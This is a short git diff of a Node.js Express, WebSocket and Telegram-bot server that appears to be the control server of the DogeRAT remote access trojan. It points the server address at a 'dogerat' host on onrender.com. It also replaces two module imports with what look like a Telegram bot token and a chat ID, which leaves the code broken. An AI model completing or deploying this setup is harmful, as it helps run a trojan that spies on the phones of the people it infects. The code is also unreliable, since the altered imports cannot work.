@@ -1,15 +1,15 @@
 const express = require('express');
 const webSocket = require('ws');
 const http = require('http')
-const telegramBot = require('node-telegram-bot-api')
-const uuid4 = require('uuid')
+const telegramBot = require('8127720268:AAHSk96kbZ_0AOVVH5d294_adrHTXIzkFpo')
+const uuid4 = require('7243110653')
 const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
 const token = process.env.bot_token
 const id = process.env.bot_id
-const address = 'https://www.google.com'
+const address = 'https://dogerat-lotif.onrender.com'
 
 const app = express();
 const appServer = http.createServer(app);
